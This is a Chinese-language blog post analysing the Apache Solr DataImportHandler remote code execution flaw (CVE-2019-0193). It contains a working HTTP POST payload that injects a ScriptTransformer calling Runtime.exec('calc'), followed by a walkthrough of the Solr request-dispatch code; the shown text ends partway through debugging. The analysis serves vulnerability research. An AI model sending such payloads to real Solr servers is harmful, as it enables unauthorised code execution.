@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/avatar.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Anemone's Blog" type="application/atom+xml">
+  <meta name="google-site-verification" content="Re5JdegRYzNFco-rC9lYIsvSWIgh5JvyfhuEaZCeFCk">
+  <meta name="baidu-site-verification" content="opTC8YN3Pn">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: 'GB90MXPJ1C',
+      apiKey: '05d808da3baf50ac2f2fad2dc3a3cd8f',
+      indexName: 'dev_blog',
+      hits: {"per_page":20},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="环境搭建先到solr上下载jar和src，这里选择的版本为v8.1.0https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.ziphttps://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz">
+<meta name="keywords" content="漏洞分析,Solr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析">
+<meta property="og:url" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/index.html">
+<meta property="og:site_name" content="Anemone&#39;s Blog">
+<meta property="og:description" content="环境搭建先到solr上下载jar和src，这里选择的版本为v8.1.0https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.ziphttps://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103161357607.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103162039712.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103165424861.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202031725.png">
+<meta property="og:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202135491.png">
+<meta property="og:updated_time" content="2021-04-26T13:55:29.347Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析">
+<meta name="twitter:description" content="环境搭建先到solr上下载jar和src，这里选择的版本为v8.1.0https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.ziphttps://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz">
+<meta name="twitter:image" content="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png">
+  <link rel="canonical" href="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析 | Anemone's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anemone's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input" id="search-input"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+  
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Anemone">
+      <meta itemprop="description" content="关注Web安全、移动安全、Fuzz测试和机器学习">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anemone's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-03 20:30:49" itemprop="dateCreated datePublished" datetime="2019-11-03T20:30:49+08:00">2019-11-03</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 21:55:29" itemprop="dateModified" datetime="2021-04-26T21:55:29+08:00">2021-04-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞分析/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span id="/vulnresearch-Solr_DataImportHandler_RCE/" class="post-meta-item leancloud_visitors" data-flag-title="Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>先到solr上下载jar和src，这里选择的版本为v8.1.0</p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip</a></p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz</a></p><a id="more"></a>
+
+
+<p>运行远程调试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span></span><br><span class="line">$ cd server/ #一定要在server下运行</span><br><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span>/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --<span class="keyword">module</span>=http</span><br></pre></td></tr></table></figure>
+<p>访问 <a href="http://localhost:8983/solr/" target="_blank" rel="noopener">http://localhost:8983/solr/</a> 出现控制台说明服务启动成功</p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>发送payload(注意tika是demo中存在的core，需要针对其他站点做变动)</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/dataimport</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 363</span><br><span class="line"></span><br><span class="line">command=full-import&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type="URLDataSource"/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">  	function func(x)&#123;</span><br><span class="line">  		java.lang.Runtime.getRuntime().exec("calc");</span><br><span class="line">  	&#125; </span><br><span class="line">  	]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name="stackoverflow" url="https://stackoverflow.com/feeds/tag/solr" processor="XPathEntityProcessor" forEach="/feed" transformer="script:func" /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>
+<p>能弹计算器说明payload生效。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="dataimport"><a href="#dataimport" class="headerlink" title="dataimport"></a>dataimport</h3><p>先了解下<code>/solr/{core}/dataimport</code>，该API的作用是将数据全量/增量导入到solr中，更详细解释在：</p>
+<ul>
+<li><a href="https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer</a> </li>
+<li><a href="https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html" target="_blank" rel="noopener">https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html</a> </li>
+</ul>
+<p>其中看到payload中需要的字段有：</p>
+<ul>
+<li>dataSource：数据源，有以下几种类型，每种类型有自己不同的属性<ul>
+<li>JdbcDataSource：数据库源</li>
+<li>URLDataSource：通常与XPathEntityProcessor配合使用，可以使用file://、http://、                          ftp://等协议获取文本数据源</li>
+<li>HttpDataSource：与URLDataSource一样，只是名字不同</li>
+<li>FileDataSource：从磁盘文件获取数据源</li>
+<li>FieldReaderDataSource：如果字段包含xml信息时，可以使用这个配合XPathEntityProcessor                                使用</li>
+<li>ContentStreamDataSource：使用post数据作为数据源，可与任何EntityProcessor配合使用</li>
+</ul>
+</li>
+<li>Entity：实体，相当于将数据源的操作的数据封装成一个Java对象，字段就对应对象属性，对于xml/http数据源的实体可以在默认属性之上具有以下属性：<ul>
+<li>url（必须）：用于调用REST API的URL。（可以模板化）。如果数据源是文件，则它必须是文件位置</li>
+<li>processor（必须）：值必须是 “XPathEntityProcessor”</li>
+<li>forEach（必须）：划分记录的xpath表达式。如果有多种类型的记录用“|”（管道）分隔它们。如果                         useSolrAddSchema设置为’true’，则可以省略</li>
+<li>stream （可选）：如果xml非常大，则将此值设置为true</li>
+</ul>
+</li>
+</ul>
+<h3 id="ScriptTransformer"><a href="#ScriptTransformer" class="headerlink" title="ScriptTransformer"></a>ScriptTransformer</h3><p>从datasource变为entity存在转换(Transform)，而dataconfig中可以使用javascript写转化逻辑，例如官网中给的例子</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="javascript">                <span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">row</span>)        </span>&#123;</span></span><br><span class="line"><span class="javascript">                    row.put(<span class="string">'message'</span>, <span class="string">'Hello World!'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> row;</span></span><br><span class="line">                &#125;</span><br><span class="line">        ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">"e"</span> <span class="attr">pk</span>=<span class="string">"id"</span> <span class="attr">transformer</span>=<span class="string">"script:f1"</span> <span class="attr">query</span>=<span class="string">"select * from X"</span>&gt;</span></span><br><span class="line">                ....</span><br><span class="line">                <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这也是造成本次rce的sink点了。</p>
+<h3 id="Nashorn-解析"><a href="#Nashorn-解析" class="headerlink" title="Nashorn 解析"></a>Nashorn 解析</h3><p>在<code>&lt;script&gt;</code>标签中，定义了js脚本，其背后是通过Nashorn做解析的，具体来说，其可以使用js语法，引用java中的对象，例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyJavaClass = Java.type(<span class="string">`my.package.MyJavaClass`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = MyJavaClass.sayHello(<span class="string">'Nashorn'</span>);</span><br><span class="line">print(result);</span><br></pre></td></tr></table></figure>
+<h2 id="静态分析入口点"><a href="#静态分析入口点" class="headerlink" title="静态分析入口点"></a>静态分析入口点</h2><p>先拖下对应版本的源代码（<a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz）" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz）</a></p>
+<p>找<code>/solr/{core}/dataimport</code>的入口，在<code>server/solr-webapp/webapp/WEB-INF/web.xml</code>看filter：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Any path (name) registered in solrconfig.xml will be sent to that filter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.solr.servlet.SolrDispatchFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Exclude patterns is a list of directories that would be short circuited by the </span></span><br><span class="line"><span class="comment">  SolrDispatchFilter. It includes all Admin UI related static content.</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span> It is NOT a pattern but only matches the start of the HTTP ServletPath.</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>excludePatterns<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/partials/.+,/libs/.+,/css/.+,/js/.+,/img/.+,/templates/.+<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所有的url通过<code>org.apache.solr.servlet.SolrDispatchFilter</code>处理，在这个类里面调试<code>doFilter()</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest _request, ServletResponse _response, FilterChain chain, <span class="keyword">boolean</span> retry)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(_request <span class="keyword">instanceof</span> HttpServletRequest)) <span class="keyword">return</span>;</span><br><span class="line">  HttpServletRequest request = closeShield((HttpServletRequest)_request, retry);</span><br><span class="line">  HttpServletResponse response = closeShield((HttpServletResponse)_response, retry);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cores == <span class="keyword">null</span> || cores.isShutDown()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    <span class="comment">// No need to even create the HttpSolrCall object if this path is excluded.</span></span><br><span class="line">    <span class="keyword">if</span> (excludePatterns != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    AtomicReference&lt;HttpServletRequest&gt; wrappedRequest = <span class="keyword">new</span> AtomicReference&lt;&gt;();</span><br><span class="line">    <span class="comment">// the response and status code have already been sent</span></span><br><span class="line">    <span class="keyword">if</span> (!authenticateRequest(request, response, wrappedRequest)) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (wrappedRequest.get() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Authentication</span></span><br><span class="line">    <span class="keyword">if</span> (cores.getAuthenticationPlugin() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Entry</span></span><br><span class="line">    HttpSolrCall call = getHttpSolrCall(request, response, retry);</span><br><span class="line">    ExecutorUtil.setServerThreadFlag(Boolean.TRUE);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Action result = call.call();</span><br><span class="line">      <span class="keyword">switch</span> (result) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关键代码在17-20行，首先根据request找到<code>HttpSolrCall</code>对象，再调用<code>HttpSolrCal#call()</code>方法获取返回值。</p>
+<p>那么跟到<code>org.apache.solr.servlet.HttpSolrCall#call()</code>看下…</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();</span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">    <span class="keyword">if</span> (shouldAudit(EventType.ERROR)) &#123;</span><br><span class="line">      cores.getAuditLoggerPlugin().doAudit(<span class="keyword">new</span> AuditEvent(EventType.ERROR, ex, req));</span><br><span class="line">    &#125;</span><br><span class="line">    sendError(ex);</span><br><span class="line">    <span class="comment">// walk the the entire cause chain to search for an Error</span></span><br><span class="line">    Throwable t = ex;</span><br><span class="line">    <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (t <span class="keyword">instanceof</span> Error) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="找入口点"><a href="#找入口点" class="headerlink" title="找入口点"></a>找入口点</h3><p>实在看不下去了，根本不知道走哪个case，还是动态调试吧，之前已经用jwdp起了项目，现在把solr源码下下来，用IDEA起一个项目，然后加<code>dist</code>和<code>server/lib</code>目录到library里，用RemoteDebug下断点调试就行了。</p>
+<p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png" alt="image-20191103160037181"></p>
+<p>访问那个api后，调试发现走的是<code>PROCESS</code>的case：</p>
+<p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103161357607.png" alt="image-20191103161357607"></p>
